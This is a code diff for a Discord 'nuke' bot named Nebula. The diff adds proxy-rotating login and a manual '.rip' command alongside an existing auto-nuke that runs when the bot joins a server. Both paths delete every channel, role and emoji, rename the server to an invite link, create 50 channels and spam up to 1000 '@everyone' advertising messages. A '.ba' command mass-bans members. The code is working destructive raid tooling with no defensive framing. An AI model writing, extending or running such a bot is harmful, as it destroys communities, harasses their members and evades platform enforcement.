@@ -1,6 +1,8 @@
 const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
+const { SocksProxyAgent } = require('socks-proxy-agent');
+const fs = require('fs');
 
 dotenv.config();
 
@@ -72,13 +74,85 @@ client.on('ready', () => {
   console.log(`🚀 Logged in as ${client.user.tag}`);
 });
 
+// ====== LOAD PROXIES ======
+function loadProxies() {
+  try {
+    const data = fs.readFileSync('proxies.txt', 'utf8');
+    return data
+      .split('\n')
+      .map(line => line.trim())
+      .filter(line => line.length > 0 && !line.startsWith('#'));
+  } catch (err) {
+    console.warn('❌ Could not read proxies.txt:', err.message);
+    return [];
+  }
+}
+
+function createProxyAgent(proxy) {
+  const match = proxy.match(/(?:([^:]+):([^@]+)@)?([^:]+):(\d+)/);
+  if (!match) return null;
+
+  const [, username, password, host, port] = match;
+  return new SocksProxyAgent({
+    host,
+    port: parseInt(port, 10),
+    protocol: 'socks5:',
+    username: username || undefined,
+    password: password || undefined,
+  });
+}
+
+// ====== LOGIN WITH PROXY ======
+async function tryLoginWithProxies(token, proxies) {
+  console.log(`🔍 Loaded ${proxies.length} proxies.`);
+
+  for (const proxy of proxies) {
+    console.log(`🔁 Trying proxy: ${proxy}`);
+    try {
+      const agent = createProxyAgent(proxy);
+      if (!agent) {
+        console.warn(`⚠️ Invalid proxy format: ${proxy}`);
+        continue;
+      }
+
+      client.options.http.agent = () => agent;
+
+      await new Promise((resolve, reject) => {
+        const timeout = setTimeout(() => {
+          reject(new Error('Connection timeout'));
+        }, 10000);
+
+        client.once('ready', () => {
+          clearTimeout(timeout);
+          resolve();
+        });
+
+        client.once('error', (err) => {
+          clearTimeout(timeout);
+          reject(err);
+        });
+
+        client.login(token).catch(reject);
+      });
+
+      console.log(`✅ Successfully connected using proxy: ${proxy}`);
+      return true;
+    } catch (err) {
+      console.error(`❌ Failed with proxy ${proxy}:`, err.message);
+      await new Promise(r => setTimeout(r, 1000));
+      continue;
+    }
+  }
+
+  return false;
+}
+
 // ====== AUTO-NUKE ON JOIN ======
 client.on('guildCreate', async (guild) => {
   const BLOCKED_GUILD_ID = '1345474714331643956';
   const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
   const channelName = 'neb-was-here';
 
-  // Block specific server
   if (guild.id === BLOCKED_GUILD_ID) {
     console.log(`🚫 Blocked from nuking guild: ${guild.name}`);
     await safeLeaveGuild(guild);
@@ -91,10 +165,9 @@ client.on('guildCreate', async (guild) => {
   let sent = 0;
 
   try {
-    // Small delay after join to avoid rate limits
     await new Promise(resolve => setTimeout(resolve, 2000));
 
-    // Step 1: Delete channels
+    // Delete channels
     console.log('🧹 Deleting channels...');
     await Promise.all(guild.channels.cache.map(async (channel) => {
       const result = await handleRateLimit(() =>
@@ -106,7 +179,7 @@ client.on('guildCreate', async (guild) => {
       }
     }));
 
-    // Step 2: Delete roles
+    // Delete roles
     console.log('🛡️ Deleting roles...');
     await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(async (role) => {
       const result = await handleRateLimit(() =>
@@ -118,7 +191,7 @@ client.on('guildCreate', async (guild) => {
       }
     }));
 
-    // Step 3: Delete emojis
+    // Delete emojis
     console.log('🖼️ Deleting emojis...');
     await Promise.all(guild.emojis.cache.map(async (emoji) => {
       const result = await handleRateLimit(() =>
@@ -130,7 +203,7 @@ client.on('guildCreate', async (guild) => {
       }
     }));
 
-    // Step 4: Rename server
+    // Rename server
     console.log('📛 Renaming server...');
     await handleRateLimit(() =>
       guild.setName('discord.gg/migh').catch(e => console.warn(`Rename fail: ${e.message}`))
@@ -138,7 +211,7 @@ client.on('guildCreate', async (guild) => {
     console.log('✅ Server renamed.');
     didSomething = true;
 
-    // Step 5: Create 50 channels
+    // Create 50 channels
     const createdChannels = [];
     const totalChannelsToCreate = 50;
     const batchSize = 25;
@@ -162,16 +235,16 @@ client.on('guildCreate', async (guild) => {
         batchPromises.push(createChan());
       }
       await Promise.all(batchPromises);
-      await new Promise(r => setTimeout(r, 500)); // Delay between batches
+      await new Promise(r => setTimeout(r, 500));
     }
 
     if (createdChannels.length === 0) {
-      console.error('❌ No channels created. Aborting spam.');
+      console.error('❌ No channels created. Aborting.');
       await safeLeaveGuild(guild);
       return;
     }
 
-    // Step 6: Spam up to 1000 messages (20 per channel)
+    // Spam 20 messages per channel (max 1000)
     const validChannels = createdChannels.filter(ch => ch && ch.id);
     const MAX_MESSAGES = 1000;
     const MESSAGES_PER_CHANNEL = 20;
@@ -193,26 +266,20 @@ client.on('guildCreate', async (guild) => {
     await Promise.all(sendBatch.map(fn => fn()));
     console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);
 
-    // Leave if most spam succeeded
-    if (sent >= 950) {
-      await safeLeaveGuild(guild);
-    } else {
-      console.log('🚫 Not enough messages sent. Not leaving.');
-    }
+    if (sent >= 950) await safeLeaveGuild(guild);
 
     if (didSomething) {
       console.log('✅ Auto-nuke complete.');
     } else {
       console.error('🚫 Failed to perform any actions.');
     }
-
   } catch (err) {
     console.error('🚨 Critical error during auto-nuke:', err.message);
     await safeLeaveGuild(guild);
   }
 });
 
-// ====== MESSAGE HANDLER (Only .help and .ba) ======
+// ====== MESSAGE HANDLER (.help, .ba, .servers) ======
 client.on('messageCreate', async (message) => {
   if (!message.content.startsWith('.') || message.author.bot) return;
 
@@ -226,6 +293,7 @@ client.on('messageCreate', async (message) => {
       .setTitle('🤖 Nebula Bot Commands')
       .setDescription('Here are the available commands for Nebula Bot:')
       .addFields(
+        { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
         { name: '.ba', value: 'Bans all members (except owner)' },
         { name: '.help', value: 'Sends this help to your DMs' }
       )
@@ -234,19 +302,15 @@ client.on('messageCreate', async (message) => {
 
     try {
       await message.author.send({ embeds: [helpEmbed] });
-      if (message.channel?.send) {
-        await message.reply('📬 Sent help to your DMs!');
-      }
+      await message.reply('📬 Sent help to your DMs!');
     } catch (err) {
       console.error('❌ Could not send DM:', err.message);
-      if (message.channel?.send) {
-        await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
-      }
+      await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
     }
     return;
   }
 
-  // ===== SERVERS COMMAND (Restricted to specific user) =====
+  // ===== SERVERS COMMAND (Owner Only) =====
   if (command === 'servers') {
     if (message.author.id !== '1400281740978815118') {
       return message.reply('❌ You are not authorized to use this command.');
@@ -256,9 +320,7 @@ client.on('messageCreate', async (message) => {
     const serverList = [];
 
     console.log(`📥 ${message.author.tag} requested .servers`);
-    if (message.channel?.send) {
-      await message.reply('📬 Fetching server list...');
-    }
+    await message.reply('📬 Fetching server list...');
 
     for (const [id, guild] of guilds.entries()) {
       try {
@@ -295,9 +357,7 @@ client.on('messageCreate', async (message) => {
     }
 
     try {
-      const dmChannel = await message.author.createDM();
-      await dmChannel.send({ embeds: [embed] });
-
+      await message.author.send({ embeds: [embed] });
       if (serverList.length > 25) {
         for (let i = 25; i < serverList.length; i += 25) {
           const page = serverList.slice(i, i + 25);
@@ -310,36 +370,29 @@ client.on('messageCreate', async (message) => {
               : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
             moreEmbed.addFields({ name: `${serverList.indexOf(server) + 1}. ${server.name}`, value });
           }
-          await dmChannel.send({ embeds: [moreEmbed] });
+          await message.author.send({ embeds: [moreEmbed] });
         }
       }
-
-      if (message.channel?.send) {
-        await message.reply('✅ Server list sent to your DMs!');
-      }
+      await message.reply('✅ Server list sent to your DMs!');
     } catch (err) {
       console.error('❌ Failed to send DM:', err.message);
-      if (message.channel?.send) {
-        await message.reply('❌ Could not send DM. Make sure your DMs are open.');
-      }
+      await message.reply('❌ Could not send DM. Make sure your DMs are open.');
     }
     return;
   }
 
-  // Block .ba in blocked server
-  if (command === 'ba' && message.guild.id === BLOCKED_GUILD_ID) {
+  // Block .ba and .rip in blocked server
+  if ((command === 'ba' || command === 'rip') && message.guild.id === BLOCKED_GUILD_ID) {
     return message.reply('🚫 This command is disabled in this server.');
   }
 
-  // ===== BAN ALL MEMBERS =====
+  // ===== BAN ALL COMMAND =====
   if (command === 'ba') {
-    if (!message.member || !message.member.permissions.has('BAN_MEMBERS')) {
+    if (!message.member.permissions.has('BAN_MEMBERS')) {
       return message.reply("❌ You don't have permission to ban members.");
     }
 
     const guild = message.guild;
-    if (!guild) return;
-
     const ownerID = guild.ownerId;
 
     try {
@@ -389,7 +442,125 @@ client.on('messageCreate', async (message) => {
       await message.reply(`❌ Error occurred while fetching members: ${fetchErr.message}`);
     }
   }
+
+  // ===== RIP COMMAND (Still works manually) =====
+  if (command === 'rip') {
+    const guild = message.guild;
+    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
+    const channelName = 'neb-was-here';
+    let didSomething = false;
+    let sent = 0;
+
+    try {
+      console.log(`🎯 Manually nuking server: ${guild.name}`);
+
+      // Delete channels
+      await Promise.all(guild.channels.cache.map(async (channel) => {
+        const result = await handleRateLimit(() =>
+          channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`))
+        );
+        if (result) {
+          console.log(`🗑️ Deleted channel: ${channel.name}`);
+          didSomething = true;
+        }
+      }));
+
+      // Delete roles
+      await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(async (role) => {
+        const result = await handleRateLimit(() =>
+          role.delete().catch(e => console.warn(`Role del fail: ${e.message}`))
+        );
+        if (result) {
+          console.log(`🗑️ Deleted role: ${role.name}`);
+          didSomething = true;
+        }
+      }));
+
+      // Delete emojis
+      await Promise.all(guild.emojis.cache.map(async (emoji) => {
+        const result = await handleRateLimit(() =>
+          emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`))
+        );
+        if (result) {
+          console.log(`🗑️ Deleted emoji: ${emoji.name}`);
+          didSomething = true;
+        }
+      }));
+
+      // Rename server
+      await handleRateLimit(() =>
+        guild.setName('discord.gg/migh').catch(e => console.warn(`Rename fail: ${e.message}`))
+      );
+      console.log('✅ Server renamed.');
+      didSomething = true;
+
+      // Create 50 channels
+      const createdChannels = [];
+      for (let i = 0; i < 50; i++) {
+        const channel = await handleRateLimit(() =>
+          guild.channels.create({ name: `${channelName}-${i + 1}` })
+            .catch(e => console.warn(`Channel #${i + 1} failed:`, e.message))
+        );
+        if (channel) {
+          console.log(`✅ Created channel: ${channel.name}`);
+          createdChannels.push(channel);
+          didSomething = true;
+        }
+      }
+
+      if (createdChannels.length === 0) {
+        console.error('❌ No channels created.');
+        return message.channel.send('❌ Could not create any channels.');
+      }
+
+      // Spam 1000 messages
+      const validChannels = createdChannels.filter(ch => ch);
+      for (const channel of validChannels) {
+        for (let i = 0; i < 20 && sent < 1000; i++) {
+          try {
+            await handleRateLimit(() => channel.send(spamMessage));
+            sent++;
+            if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
+          } catch (err) {
+            console.error(`⚠️ Send failed: ${err.message}`);
+          }
+          await new Promise(r => setTimeout(r, 2));
+        }
+      }
+
+      console.log(`✅ Sent ${sent} spam messages.`);
+      if (sent >= 950) await safeLeaveGuild(guild);
+
+      await message.channel.send('✅ Successfully nuked server.');
+    } catch (err) {
+      console.error('🚨 Error during .rip:', err.message);
+      await message.channel.send(`❌ Operation failed: ${err.message}`);
+    }
+  }
 });
 
-// ====== LOGIN ======
-client.login(process.env.TOKEN);
+// ====== LOGIN WITH PROXY OR DIRECT ======
+(async () => {
+  const token = process.env.TOKEN;
+  if (!token) {
+    console.error('❌ No token found in .env');
+    return;
+  }
+
+  const proxies = loadProxies();
+
+  if (proxies.length === 0) {
+    console.log('⚠️ No proxies found. Connecting directly...');
+    try {
+      await client.login(token);
+    } catch (err) {
+      console.error('❌ Direct login failed:', err.message);
+    }
+    return;
+  }
+
+  const success = await tryLoginWithProxies(token, proxies);
+  if (!success) {
+    console.error('💀 All proxies failed. Bot cannot connect.');
+  }
+})();
